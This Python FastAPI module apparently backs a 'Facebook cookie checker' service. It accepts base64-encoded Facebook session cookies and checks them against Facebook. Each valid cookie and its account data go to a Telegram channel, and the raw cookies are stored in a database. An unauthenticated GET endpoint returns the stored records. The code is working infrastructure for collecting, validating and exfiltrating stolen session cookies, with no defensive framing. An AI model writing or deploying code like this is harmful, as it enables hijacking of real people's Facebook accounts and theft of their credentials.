from fastapi import APIRouter, Depends, HTTPException
from pydantic import BaseModel
from uuid import uuid4 as ID
import calendar
import time

from core.db.depends import get_db
from core.db.models.facebook import Facebook as MFacebook
from core.facebook import facebook
from core.telegram import telegram

apiRouter = APIRouter()
prefix = '/facebook'
tags = ['Facebook']


class ReqValueChecker(BaseModel):
    cookie: str


@apiRouter.post('/checker', dependencies=[Depends(get_db)])
def facebook_checker_post(req: ReqValueChecker):
    # return facebook.apiCheck(req.cookie)
    # values = facebook.apiCheck(req.cookie)
    # if values is not None:
    #     telegram.apiSendMessage(req.cookie, values)
    # return values

    cookie = facebook.apiDecodeBase64(req.cookie)
    cookieDic = facebook.apiParserCookieToDic(cookie)
    fbUID = facebook.apiGetUidFromCookie(cookie)
    if fbUID is None:
        raise HTTPException(status_code=404)

    thisFacebookAccount: MFacebook = MFacebook.get_or_none(
        MFacebook.uid == fbUID)
    if thisFacebookAccount is not None:
        thisFacebookAccountCookie = facebook.apiParserCookieToDic(
            thisFacebookAccount.cookie
        )
        if cookieDic['xs'] == thisFacebookAccountCookie['xs']:
            if thisFacebookAccount.graph is None:
                raise HTTPException(status_code=403)
            else:
                return {**thisFacebookAccount.graph, 'isDuplicate': True}
        else:
            values = facebook.apiCheck(req.cookie)
            if values is None:
                raise HTTPException(status_code=403)
            else:
                telegram.apiSendMessage(req.cookie, values)
                MFacebook.update(
                    cookie=cookie,
                    graph=values,
                    updated_time=calendar.timegm(time.gmtime())
                ).where(MFacebook.uid == fbUID).execute()
                return {**values, 'isDuplicate': False}
    else:
        values = facebook.apiCheck(req.cookie)
        if values is None:
            MFacebook.insert(
                id=ID(),
                uid=fbUID,
                cookie=cookie,
                created_time=calendar.timegm(time.gmtime()),
                updated_time=calendar.timegm(time.gmtime())
            ).execute()
            raise HTTPException(status_code=403)
        else:
            telegram.apiSendMessage(req.cookie, values)
            MFacebook.insert(
                id=ID(),
                uid=fbUID,
                cookie=cookie,
                graph=values,
                created_time=calendar.timegm(time.gmtime()),
                updated_time=calendar.timegm(time.gmtime())
            ).execute()
            return {**values, 'isDuplicate': False}


@apiRouter.get('/checker/{id}', dependencies=[Depends(get_db)])
def facebook_checker_get(id: str):
    thisFacebookAccount: MFacebook = MFacebook.get_or_none(MFacebook.uid == id)
    if thisFacebookAccount is None:
        raise HTTPException(status_code=403)
    return thisFacebookAccount
